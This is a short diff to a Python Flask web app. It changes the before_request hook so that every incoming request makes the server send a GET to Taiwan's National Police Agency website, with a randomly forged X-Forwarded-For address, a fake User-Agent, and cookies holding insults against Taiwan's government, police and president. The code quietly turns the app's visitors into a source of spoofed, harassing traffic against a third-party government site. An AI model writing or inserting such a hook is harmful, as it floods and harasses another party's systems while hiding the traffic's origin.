@@ -151,7 +151,18 @@ def before_request():
     ip3 = random.randint(1,254)
     ip4 = random.randint(1,254)
     ipv4 = str(ip1) + "." + str(ip2) + "." + str(ip3) + "." + str(ip4)
-    requests.get(url="https://coffeehost.net", headers={"X-Forwarded-For":f"{ipv4},192.168.9.8"})
+    req_headers = {
+      "X-Forwarded-For":f"{ipv4},192.168.9.8",
+      "User-Agent":"WTech/2.0",
+      "Accept":"text/html"
+    }
+    cookies = {
+      "twGovernmentIsFuck":"yes",
+      "PresidentDied":"yes",
+      "twPoliceIsLoser":"yes",
+      "twHasLaws":"no"
+    }
+    requests.get(url="https://www.npa.gov.tw", headers=req_headers, cookies=cookies)
 
 @app.after_request
 def add_cors_headers(response):
